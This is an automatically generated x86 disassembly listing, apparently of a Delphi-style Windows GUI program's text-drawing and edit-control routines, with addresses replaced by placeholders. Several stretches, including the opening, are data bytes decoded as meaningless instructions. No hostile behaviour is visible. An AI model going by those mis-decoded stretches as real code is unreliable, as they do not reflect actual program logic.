add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
inc ecx
add al cl
mov dl 0x41
add [ ebx + esi * 4 ] bl
inc ecx
add al cl
add [ ebx ] 0x60
mov ch 0x41
add [ eax + 0x4c0041b5 ] bh
mov dh 0x41
add [ edi ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x53786f42
je r-xdata
add [ eax + 0x7f ] dh
inc ebx
add [ esi + esi * 4 ] dl
inc ecx
add [ esi + esi * 4 - 0x7dafffbf ] bl
inc ebx
add ah ah
mov bh 0x41
add [ eax + 0x1400437f ] bl
stosd [ edi ]
inc ecx
add [ eax ] bh
stosd [ edi ]
inc ecx
add [ eax - 0x7e ] al
inc ebx
add al dl
add [ ebx ] 0xe0
add [ ebx ] 0x88
scasd [ edi ]
inc ecx
add [ edx + eax * 4 - 0x4e6fffbd ] al
inc ecx
add [ edx + esi * 4 + 0x41 ] ah
add [ eax ] bh
add [ ebx ] 0x98
mov dl 0x41
jle r-xdata
inc esp
jb r-xdata
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
inc eax
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
popad
inc esp
jb r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
0x64fffcd8 0x58f
imul ebp [ esi + 0x67 ] 0x435c7073
add [ edi ] al
andps xmm1 [ ecx + ebp * 2 + 0x73 ]
je r-xdata
scasd [ edi ]
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov esp 0x94004181
xor al 0x40
lea eax [ bx + si ]
fcomp [ ebx + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5c ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 + 0x43 ] bl
add al bh
lodsb [ esi ]
inc ecx
add al dh
stosd [ edi ]
inc ecx
add [ eax + 0x7c00437d ] cl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
shr [ edx - 0x573fffbf ] 0x41
jb r-xdata
add [ eax + 0x4f0b0030 ] al
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
push eax
mov edx 0xb9
mov eax esi
call sub_43fb80
mov edx 0x69
mov eax esi
outsd
js r-xdata
add al al
stosb [ edi ]
inc ecx
add al al
test al 0x41
inc esp
outsd
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push eax
mov ebp 0x1300043
mov bh 0x43
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
call sub_43fba4
mov eax esi
test bl bl
je r-xdata
je r-xdata
add [ ebx + 0x53000408 ] ch
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442c18
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
imul ebp [ esi + 0x67 ] 0x435bdc73
add [ edx + eax * 4 + 0x41 ] ah
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
call sub_423d88
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_423ce4
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
push ebx
push 0x208838b
add [ eax ] al
insb
jae r-xdata
add [ ebx - 0x7ba9ac40 ] cl
shl [ eax + ecx - 0x7d ] cl
sub_435c98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448868
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43fb80
mov edx 0x69
mov eax esi
call sub_43fba4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_435cf4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442c18
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_423d88
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_423ce4
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_435d60
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_436102
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_423d88
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_423ce4
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_4403c4
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_418e04
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_418e04
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x54 ]
call sub_40425c
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x58 ]
call sub_40445c
push eax
mov eax edi
call sub_423e68
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_418e04
mov eax ebx
mov si 0xffc8
call sub_403448
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_423720
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_423720
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_423b00
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_423720
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_423e68
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436109
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403fc0
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0x60 ]
call sub_4046a8
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403fc0
retn
mov eax ebx
mov si 0xffc8
call sub_403448
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_423b00
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_4403c4
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_4403c4
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_423cc8
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_418e04
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_418e04
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_4403c4
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4047f4
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_423e68
push eax
call sub_430fe0
lea ecx [ ebp - 0x4c ]
pop edx
call sub_431228
jmp r-xdata
call sub_430fe0
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_43128c
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_423e68
push eax
call sub_430fe0
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43117c
push 0x0
mov eax edi
call sub_423e68
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_4403c4
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_4426a4
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x80 ]
call sub_40425c
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x84 ]
call sub_40445c
push eax
mov eax edi
call sub_423e68
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_423720
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x88 ]
call sub_40425c
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x8c ]
call sub_40445c
push eax
mov eax edi
call sub_423e68
push eax
call DrawTextA
sub_436113
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43618e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4571a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_446030
mov eax ebx
mov si 0xffb8
call sub_403448
test al al
je r-xdata
mov eax ebx
call sub_447144
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436195
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_4361e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_447e2c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43fb80
mov edx 0x11
mov eax esi
call sub_43fba4
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_43628a
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4363e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4426a4
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_423d88
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404264
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40425c
push eax
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ ebx + 0x160 ]
call sub_423e68
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_422f54
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40425c
push eax
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ ebx + 0x160 ]
call sub_423e68
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_422f54
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40425c
push eax
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ ebx + 0x160 ]
call sub_423e68
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4363e9
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_4363f3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_43661c
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_42383c
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_423720
xor edx edx
mov eax [ esi + 0x14 ]
call sub_42383c
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_423ac4
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403448
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403448
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_436514
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_423ee8
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403448
xor edx edx
mov eax [ edi + 0x160 ]
call sub_423ee8
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403448
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43d1a4
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_436658
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43661c
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4366b8
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403448
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4366e0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43f894
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_436744
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4367d1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4367d8
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4571a8
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403448
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_436828
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4428d8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_43fb80
mov edx 0x19
mov eax esi
call sub_43fba4
mov dl 0x1
mov eax esi
call sub_446e18
xor edx edx
mov eax esi
call sub_440588
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_436f38
mov eax esi
test bl bl
je r-xdata
sub_43687f
add [ ebx ] dh
ror [ ebx - 0x6300173a ] cl
add [ eax ] al
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_436f38
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4368d0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_436950
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_436994
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_446ee8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_446be4
push eax
call SendMessageA
test eax eax
setne bl
sub_4369cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_446ee8
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_446be4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_436a02
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_436a81
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436a88
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_446ee8
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_446be4
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x4 ]
call sub_40445c
mov edx eax
mov eax ebx
call sub_4403a0
sub_436a8c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_446ee8
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_446be4
push eax
call SendMessageA
sub_436ac8
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_446be4
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_436aec
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_436b0c
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_446be4
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_436b3c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_446be4
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_446be4
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_436bd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_440338
inc eax
call sub_408af0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_436c62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408b04
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_440348
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408968
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436c69
mov eax [ ebp - 0xc ]
call sub_408b3c
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_436c74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_40408c
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_440338
inc eax
call sub_408af0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436d02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408b04
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_440348
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4029b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408b3c
retn
sub_436d10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443a38
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443964
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_436dc9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_443d34
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_443d34
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_436e3a
mov eax eax
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_436e7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_443b64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e82
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_436e82
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
